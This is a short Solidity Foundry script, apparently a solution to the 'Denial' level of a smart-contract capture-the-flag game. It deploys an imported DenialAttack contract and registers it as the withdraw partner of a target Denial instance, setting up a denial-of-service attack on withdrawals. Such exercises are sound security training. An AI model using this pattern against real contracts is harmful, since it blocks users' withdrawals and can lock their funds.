// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./Denial.sol";
import "./DenialAttack.sol";

contract DenialPOC is Script {
    function run(address payable _instance) external {
        vm.startBroadcast();
        
        DenialAttack attacker = new DenialAttack();
        Denial target = Denial(_instance);
        
        target.setWithdrawPartner(address(attacker));

        vm.stopBroadcast();
    }
}
